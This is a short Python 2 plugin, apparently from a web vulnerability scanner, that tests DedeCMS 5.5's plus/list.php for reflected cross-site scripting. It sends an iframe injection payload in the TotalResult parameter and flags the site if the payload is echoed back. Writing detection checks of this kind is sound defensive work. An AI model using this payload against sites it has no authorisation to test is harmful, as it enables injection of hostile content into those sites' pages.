#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url+="plus/list.php?tid=6&TotalResult=%3Ciframe%20src=http://www.baidu.com%3E&nativeplace=0&infotype=0&keyword=&orderby=hot&PageNo=2"

        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('<iframe src=http://www.baidu.com>')>=0 and res.has_key('content-type') and res['content-type'] != '':
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:dedecms5.5_list.php_xsscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:dedecms5.5_list.php_xsscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def